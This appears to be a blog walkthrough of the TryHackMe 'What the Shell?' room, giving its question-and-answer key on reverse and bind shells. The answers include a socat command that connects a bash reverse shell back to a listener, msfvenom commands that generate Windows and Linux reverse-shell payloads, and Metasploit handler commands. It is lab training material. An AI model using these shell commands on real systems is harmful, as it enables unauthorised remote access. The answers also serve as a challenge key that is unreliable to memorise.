---
title: <img width="50" height="50" alt="front-page port 80-shoopyu" src="https://tryhackme-images.s3.amazonaws.com/room-icons/0741ea184b13423cdc35c13147cf930b.png">  What the Shell? | Tryhackme 
author: cotes
date: 2022-08-12 14:10:00 +0800
categories: [Write Up, TryHackMe]
tags: [walkthrough, THM, Tryhackme, shell,socat,webshell,reverse shell,msfvenom,shell,bind shell]
render_with_liquid: false
---
&nbsp;

<img width="488" allign="center" alt="simple-ctf-logo" src="https://tryhackme-images.s3.amazonaws.com/room-icons/0741ea184b13423cdc35c13147cf930b.png">




# What the shell?
&nbsp;
An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.

## Task 3

>💢**note:** Task 1,2 have **no answer needed**

**Q: Which type of shell connects  _back_  to a listening port on your computer, Reverse (R) or Bind (B)?**

**A: `R`**

**Q: You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)**

**A: `N`**

**Q: When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?**

**A: `T`**
----------------------------
&nbsp;


## Task 4 Netcat

**Q: Which option tells netcat to  _listen_?**

**A: `-l`**

**Q: How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?**

**A:` nc 10.10.10.11 8080`**
----------
&nbsp;

## **Task 5 Netcat Shell Stabilisation**

**Q: How would you change your terminal size to have 238 columns?**

**A:` stty cols 238`**

**Q: What is the syntax for setting up a Python3 webserver on port 80?**

**A: sudo python3 -m http.server 80**
-----
&nbsp;

## Task 6 Socat

**Q: How would we get socat to listen on TCP port 8080?**

**A: `TCP-L:8080`**
---
&nbsp;


## **Task 7 Socat Encrypted Shells**

**Q: What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"**

**A:** ```socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0```

**Q: If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?**

**A:** ``socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane``

-----
&nbsp;


## **Task 8 Common Shell Payloads**

**Q: What command can be used to create a  _named pipe_ in Linux?**

**A: ``mkfifo``**


--
&nbsp;

## **Task 9 msfvenom**

**Q: Generate a staged reverse shell for a 64 bit Windows target, in a  `.exe`  format using your TryHackMe tun0 IP address and a chosen port**

**A: ```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port number>```**

**Q: Which symbol is used to show that a shell is stageless?**

**A: ``_``**

**Q: What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is  _elf_ and the output filename should be  _shell_**

**A: ```msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443```**

## **Task 10 Metasploit multi/handler**

Q: What command can be used to start a listener in the background?

A: **`exploit -j`**

Q: If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?

A: **`sessions 10`**
